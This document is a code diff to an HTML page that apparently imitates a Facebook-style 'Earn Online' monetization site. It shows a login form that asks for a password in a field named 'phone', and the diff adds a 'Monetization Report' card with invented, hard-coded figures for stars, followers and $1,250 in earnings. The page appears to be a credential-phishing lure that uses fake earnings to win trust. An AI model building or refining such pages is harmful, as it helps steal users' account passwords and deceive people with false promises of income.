@@ -55,6 +55,7 @@ button{
     border:none;
     border-radius:10px;
     font-size:18px;
+    margin-top:10px;
 }
 
 .info{
@@ -62,6 +63,35 @@ button{
     background:#f0f2f5;
     padding:15px;
     border-radius:10px;
+}
+
+/* Report Design */
+
+#report{
+    display:none;
+}
+
+.report-card{
+    background:white;
+    width:85%;
+    max-width:400px;
+    margin:20px auto;
+    padding:25px;
+    border-radius:20px;
+    box-shadow:0 5px 20px rgba(0,0,0,.2);
+}
+
+.report-card h2{
+    color:#1877f2;
+    text-align:center;
+}
+
+.report-item{
+    background:#f0f2f5;
+    padding:15px;
+    margin:10px 0;
+    border-radius:10px;
+    font-size:18px;
 }
 
 </style>
@@ -86,7 +116,7 @@ button{
 
 <input type="tel" name="phone" placeholder="Password" required>
 
-<button type="Login">
+<button type="submit">
 Submit
 </button>
 
@@ -99,11 +129,48 @@ Submit
 💰 Earn Online
 </div>
 
-</div>
-
-</body>
-</html>
-<button onclick="window.location.href='report.html'">
+<button onclick="showReport()">
 Report
 </button>
 
+</div>
+
+
+<div id="report">
+
+<div class="report-card">
+
+<h2>Monetization Report</h2>
+
+<div class="report-item">
+⭐ Stars: 23,000
+</div>
+
+<div class="report-item">
+🎬 Ads: 45,000
+</div>
+
+<div class="report-item">
+👥 Followers: 120,000
+</div>
+
+<div class="report-item">
+💰 Earnings: $1,250
+</div>
+
+</div>
+
+</div>
+
+
+<script>
+
+function showReport(){
+document.getElementById("report").style.display="block";
+}
+
+</script>
+
+
+</body>
+</html>
